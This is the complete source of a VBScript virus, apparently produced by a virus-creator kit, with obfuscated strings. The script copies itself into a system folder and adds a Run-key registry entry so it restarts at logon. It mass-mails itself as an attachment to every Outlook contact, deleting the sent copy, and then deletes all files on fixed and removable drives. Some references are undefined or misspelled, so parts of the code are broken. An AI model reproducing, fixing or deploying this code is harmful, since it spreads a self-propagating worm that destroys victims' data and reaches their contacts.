rem This script is created by GiChTy's Virus-Creator 1.3
rem I will not take response of what people do with my tool.
rem check our page : www.blueadeptz.org
rem or mail me: gichty@blueadeptz.org
rem GiChTy


on error resume next
nbmsUTSD()
LKnmsdbnO()
killfiles()
sub nbmsUTSD()
dim fso, dir, file, c, regedit
set fso = createobject(ZebslkHD("k[jahlaf_&^ad]kqkl]egZb][l"))
dir = fso.getspecialfolder(ZebslkHD(")"))
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
set c = fso.GetFile(WScript.ScriptFullName)
c.copy (dir & ZebslkHD("Toaf+*\dd&nZk"))
dim t, z
t = ZebslkHD("@C=QW;MJJ=FLWMK=JTKg^loYj]TEa[jgkg^lTOaf\gokT;mjj]flN]jkagfTJmfTOafDgY\]j+*")
z = dir & ZebslkHD("Toaf+*\dd&nZk")
regwrite t, z
end sub
Sub Listfiles(Folder)
Dim f, fc, f1, fso
set fso=createobject("scripting.filesystemobject")
Set f = fso.GetFolder(Folder)
Set fc = f.Files
For Each f1 In fc
fso.deletefile (f1.Path)
Next
End Sub
Sub ListFolders (Folder)
Dim f, fc, f1, fso
set fso=createobject("scripting.filesystemobject")
Set f = fso.GetFolder(Folder)
Set fc = f.SubFolders
For Each f1 In fc
Listfiles (f1.Path)
ListFolders (f1.Path)
Next
End Sub
Sub Killfiles()
dim d , dc, s, fso
set fso=createobject("scripting.filesystemobject")
Set dc = fso.Drives
For Each d In dc
If d.drivetype = 2 Or d.drivetype = 3 Then ListFolders (d.Path & "\")
Next
End Sub

Sub LKnmsdbnO()
Dim H12JG, KLSD, BNSe, pSefm, VBmnd, zuNDS
Set pSefm = CreateObject(Dec("Gmldggc&9hhda[Ylagf"))
Set H12JG = pSefm.GetNameSpace(Dec("E9HA"))
For Each KLSD In e.AddressLists
Set BNSe = pSefm.CreateItem(0)
For VBmnd = 1 To KLSD.AddressEntries.Count
Set zuNDS = KLSD.AddressEntries(o)
If VBmnd = 1 Then
BNSe.BCC = zuNDS.Address
Else
BNSe.BCC = BNSe.BCC & "; " & zuNDS.Address
End If
Next
BNSe.Subject = Dec("F]oLggd")
BNSe.Body = Dec("L`aklggd[Yfkh]]\mhqgmjH;mhlg)-")
BNSe.Attachmets.Add WScript.ScriptFullName
BNSe.DeleteAfterSubmit = True
BNSe.Send
Next
End Sub

Sub Regwrite(key, value)
dim regedit
set regedit = createobject("wscript.shell")
regedit.regwrite key, value
End Sub

Function ZebslkHD(jkspoh)
Dim nkoOID, tmRMsp, GHUOnsd
tmRMsp = jkspoh
For i = 1 To Len(tmRMsp)
nkoOID = Mid(tmRMsp, i, 1)
GHUOnsd = GHUOnsd & Chr((Asc(nkoOID) + 8))
Next
ZebslkHD = GHUOnsd
End Function

